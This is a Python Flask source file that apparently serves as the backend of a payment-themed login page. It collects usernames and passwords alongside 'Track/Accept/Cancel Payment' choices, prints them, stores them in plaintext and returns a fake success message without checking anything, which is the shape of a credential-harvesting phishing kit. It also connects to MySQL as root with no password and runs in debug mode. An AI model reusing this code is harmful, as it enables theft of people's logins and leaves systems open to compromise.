from flask import Flask, request, render_template_string, render_template
import mysql.connector
from mysql.connector import Error

app = Flask(__name__)

# Database configuration
db_config = {
    'user': 'root',
    'password': '',  # No password
    'host': 'localhost',
    'port': '3306',
    'database': 'payment_system'
}

def get_db_connection():
    try:
        return mysql.connector.connect(**db_config)
    except Error as e:
        print("Error connecting to database:", e)
        return None

# Route to serve the index page
@app.route('/')
def home():
    return render_template('index.html')

# Route to handle the login form submission
@app.route('/submit_login', methods=['POST'])
def submit_login():
    # Retrieve form data
    username = request.form.get('username')
    password = request.form.get('password')
    action = request.form.get('action')  # Action: Track, Accept, or Cancel

    # Print debug information
    print(f"Username: {username}, Password: {password}, Action: {action}")

    # Save login info to the database
    conn = get_db_connection()
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO logins (username, password, action) VALUES (%s, %s, %s)",
                (username, password, action)
            )
            conn.commit()
            print("User details saved to the database.")
        except Error as e:
            print("Error executing query:", e)
        finally:
            cursor.close()
            conn.close()
    else:
        print("Connection to database failed.")

    # Prepare message based on the action
    if action == "Track Payment":
        message = "Tracking payment initiated!"
    elif action == "Accept Payment":
        message = "Payment accepted successfully!"
    elif action == "Cancel Payment":
        message = "Payment cancelled successfully!"
    else:
        message = "Action completed."

    return render_template_string("""
    <h2>{{ message }}</h2>
    <a href="/">Go Back</a>
    """, message=message)

if __name__ == "__main__":
    app.run(debug=True, port=5001)
